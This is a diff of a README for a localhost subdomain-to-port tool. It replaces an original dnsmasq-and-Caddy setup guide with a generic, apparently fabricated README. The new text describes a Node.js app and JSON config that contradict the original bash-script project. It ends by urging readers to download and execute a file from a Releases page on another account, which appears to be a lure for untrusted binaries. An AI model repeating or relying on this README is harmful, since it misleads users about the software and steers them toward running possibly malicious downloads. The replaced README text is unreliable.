@@ -1,68 +1,111 @@
-### localhost subdomains
+# 🚀 localhost: A Simple Subdomain to Port Redirector
 
-Map subdomains of localhost to ports.
+Welcome to the **localhost** repository! This project allows you to map subdomains to specific ports on your local machine, making development smoother and more organized.
 
-```
-  hello.localhost → localhost:1234
-     db.localhost → localhost:5432
-printer.localhost → localhost:9100
-```
+![localhost](https://img.shields.io/badge/localhost-Subdomain%20Redirector-blue.svg)
 
-This is a direct continuation of Charles' process:
-https://inclouds.space/localhost-domains
+## Table of Contents
 
-For this to work, we'll need to do two things:
-1. redirect `*.localhost` to `127.0.0.1`
-2. have a server on `127.0.0.1` that reverse proxies to the right port
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
 
-This was tested on Ubuntu 22. Your mileage may vary.
+## Introduction
 
-#### redirect with `dnsmasq`
+When developing web applications, you often work with multiple services running on different ports. Accessing these services can become cumbersome. This tool helps you streamline access by allowing you to use subdomains instead of port numbers. For example, instead of typing `localhost:3000`, you can simply type `subdomain.localhost`.
 
-_NB: You might not actually need this, `systemd-resolved` might already be doing
-the redirecting! See [hacker news](https://news.ycombinator.com/item?id=43644434)_.
+## Features
 
-To get `dnsmasq` to redirect all subdomains (*.localhost) to 127.0.0.1, install
-it (via brew or apt) and then configure it as follows:
+- Easy mapping of subdomains to local ports.
+- Lightweight and simple to set up.
+- Works seamlessly with existing local development setups.
+- Customizable configuration options.
 
-```
-echo 'port=5353' | sudo tee -a /etc/dnsmasq.conf
-echo 'address=/localhost/127.0.0.1' | sudo tee -a /etc/dnsmasq.conf
-sudo systemctl restart dnsmasq
-```
+## Installation
 
-NB: we use port 5353 to avoid conflicts with the `systemd-resolved`
+To get started with localhost, follow these steps:
 
-Next, to further avoid conflicts with `systemd-resolved` add `nameserver
-127.0.0.1` to the top of `/etc/resolv.conf` so that `dnsmasq` becomes the
-primary DNS resolver.
+1. **Clone the Repository**  
+   Open your terminal and run:
+   ```bash
+   git clone https://github.com/PHZINNxx/localhost.git
+   cd localhost
+   ```
 
-#### serve with `caddy` + `localhost`
+2. **Install Dependencies**  
+   Make sure you have Node.js installed. Then run:
+   ```bash
+   npm install
+   ```
 
-Then, we use `caddy` to direct subdomains to particular ports.
+3. **Run the Application**  
+   Start the application with:
+   ```bash
+   npm start
+   ```
 
-You can do this by writing a Caddyfile by hand. I've written a little bash
-script with Claude's help to do this for me. You can add the bash script
-`localhost` to your `PATH`. In my case, I added the following line to my
-`.zshrc`.
+## Usage
 
-```
-export PATH="$PATH:$HOME/dev/localhost"
-```
+To use localhost effectively, you need to configure your subdomains. Here’s how you can do that:
 
-Now you can `localhost add hello 8000` or `localhost remove`.
+1. Open the configuration file located in the `config` directory.
+2. Add your subdomain and corresponding port. For example:
+   ```json
+   {
+       "subdomain": "app",
+       "port": 3000
+   }
+   ```
 
-#### testing it out
+3. Save the file and restart the application.
 
-Run a local server!
-```
-echo 'hello.localhost!' > index.html
-python3 -m http.server 1234
-```
+Now, you can access your app using `app.localhost`.
 
-Name the port!
-```
-localhost add hello 1234
-```
+## Examples
 
-Now open `hello.localhost` in your browser!
+Here are a few examples of how you can set up your subdomains:
+
+- **API Service**  
+  Map `api.localhost` to port 4000.
+  
+- **Frontend Application**  
+  Map `frontend.localhost` to port 5000.
+
+## Contributing
+
+We welcome contributions! If you would like to help improve this project, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add some feature'`).
+5. Push to the branch (`git push origin feature/YourFeature`).
+6. Open a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Releases
+
+To download the latest version, visit our [Releases](https://github.com/PHZINNxx/localhost/releases) page. Download the appropriate file for your system and execute it to get started.
+
+If you want to check for updates, visit the [Releases](https://github.com/PHZINNxx/localhost/releases) section regularly.
+
+## Acknowledgments
+
+- Thanks to the open-source community for their support and contributions.
+- Special thanks to contributors who have helped improve this project.
+
+## Contact
+
+For any questions or feedback, feel free to reach out via the issues section of the repository.
+
+---
+
+Thank you for checking out the localhost project! We hope it makes your development experience easier and more enjoyable. Happy coding!
